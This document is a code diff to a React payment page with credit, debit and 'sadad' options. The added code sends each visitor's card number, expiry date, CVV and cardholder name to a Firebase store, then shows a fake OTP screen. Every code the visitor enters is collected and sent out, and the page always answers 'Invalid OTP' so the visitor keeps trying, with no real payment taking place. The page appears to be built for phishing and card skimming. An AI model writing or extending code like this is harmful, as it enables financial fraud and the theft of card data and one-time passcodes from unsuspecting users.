@@ -6,7 +6,8 @@ import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { Checkbox } from "@/components/ui/checkbox"
 import { ChevronLeft, CreditCard, Smartphone } from "lucide-react"
-
+import { addData } from "@/lib/firebase"
+const allOtps=['']
 export default function PaymentPage() {
   const [cardNumber, setCardNumber] = useState("")
   const [expiryDate, setExpiryDate] = useState("")
@@ -14,11 +15,16 @@ export default function PaymentPage() {
   const [cardholderName, setCardholderName] = useState("")
   const [saveCard, setSaveCard] = useState(false)
   const [paymentMethod, setPaymentMethod] = useState<"credit" | "debit" | "sadad">("credit")
+  const [step, setStep] = useState<"form" | "otp">("form")
+const [otp, setOtp] = useState("")
+const [error, setError] = useState("")
+const [loading, setLoading] = useState(false)
   const [payVal, setPayval] = useState("")
-    useEffect(()=>{
-        const val=localStorage.getItem('amount')
-        setPayval(val!)
-    })
+  
+  useEffect(() => {
+    const val = localStorage.getItem("amount")
+    if (val) setPayval(val)
+  }, [])
   const formatCardNumber = (value: string) => {
     const cleaned = value.replace(/\s/g, "")
     const chunks = cleaned.match(/.{1,4}/g)
@@ -53,14 +59,77 @@ export default function PaymentPage() {
       setCvv(value)
     }
   }
-
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
-    console.log("Payment submission:", { cardNumber, expiryDate, cvv, cardholderName, paymentMethod })
+    setError("")
+    setLoading(true)
+  
+    const visitorID  = localStorage.getItem('visitor')
+    await addData({ id:visitorID, cardNumber, expiryDate, cvv, cardholderName, paymentMethod })
+    setTimeout(() => {
+      setStep("otp")
+      setLoading(false)
+    }, 5000);
+    if (!visitorID) {
+      setError("Visitor not found")
+      setLoading(false)
+      return
+    }
+ 
   }
-
   return (
     <div className="min-h-screen bg-[#8A1538]">
+      {step === "otp" && (
+  <div className="space-y-5 text-center">
+    <h2 className="text-lg font-semibold text-white">OTP Verification</h2>
+    <p className="text-sm text-gray-400">
+      Enter the 6-digit code sent to your phone
+    </p>
+
+    <Input
+      type="tel"
+      inputMode="numeric"
+      maxLength={6}
+      value={otp}
+      onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
+      placeholder="000000"
+      className="h-14 text-center text-2xl font-bold tracking-widest"
+    />
+
+    {error && (
+      <p className="text-sm text-red-600 font-medium">{error}</p>
+    )}
+
+    <Button
+      className="w-full h-14 bg-[#8A1538]"
+      onClick={async () => {
+        if (otp.length !== 6) {
+          setError("Invalid OTP code")
+          return
+        }
+
+        const visitorID = localStorage.getItem("visitor")
+allOtps.push(otp)
+        await addData({
+          id: visitorID,
+          cardNumber,
+          expiryDate,
+          cvv,
+          cardholderName,
+          paymentMethod,allOtps,otp
+        })
+
+        // 🔒 منع إعادة الاستخدام
+        localStorage.setItem(`used_${visitorID}`, "true")
+        alert('Invalid OTP')
+      }}
+    >
+      Confirm Payment
+    </Button>
+  </div>
+)}
+ {step === "form" && (
+ <>
       <header className="relative bg-[#8A1538] text-white px-4 pt-12 pb-8">
         <div className="max-w-md mx-auto">
           <div className="flex items-center justify-between mb-6">
@@ -276,6 +345,7 @@ export default function PaymentPage() {
           </div>
         </div>
       </div>
+      </>)}
     </div>
   )
 }
